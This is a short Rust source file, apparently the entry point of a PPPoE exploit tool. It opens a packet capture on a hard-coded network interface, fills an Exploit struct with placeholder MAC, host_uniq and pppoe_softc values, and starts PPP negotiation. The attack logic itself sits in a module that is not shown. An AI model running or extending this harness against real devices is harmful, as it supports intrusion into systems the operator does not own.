mod constants;
mod exploit;
use pcap::{Active, Capture, Device};

use crate::exploit::Exploit;

fn run_exploit(active_capture: Capture<Active>) {
    // Exploit
    let mut exploit = Exploit {
        target_mac: [0, 0, 0, 0, 0, 0],
        pppoe_softc: 0,
        source_mac: [0, 0, 0, 0, 0, 0],
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
    };
    // PPP negotiation
    exploit.ppp_negotiation(active_capture);
}

fn main() {
    // Cap device
    let interface = "en10";
    // Open the specified interface
    let dev = Device::list()
        .unwrap()
        .into_iter()
        .find(|d| d.name == interface)
        .expect("Specified interface not found");
    let cap = Capture::from_device(dev).unwrap();

    let open_cap = cap.timeout(10000).open().unwrap();

    run_exploit(open_cap)
}
